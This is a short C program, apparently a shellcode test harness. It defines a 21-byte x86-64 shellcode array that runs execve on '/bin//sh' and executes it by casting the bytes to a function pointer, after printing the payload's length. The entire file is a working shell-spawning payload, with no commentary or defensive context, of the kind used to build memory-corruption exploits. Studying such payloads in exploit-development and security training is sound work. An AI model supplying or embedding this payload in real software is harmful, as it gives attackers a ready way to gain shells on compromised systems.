#include <stdio.h>
#include <string.h>

char shellcode[] = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69"
                             "\x6e\x2f\x2f\x73\x68\x57\x48\x89"
                             "\xe7\xb0\x3b\x0f\x05";
int main()
{
    printf("len:%d bytes\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
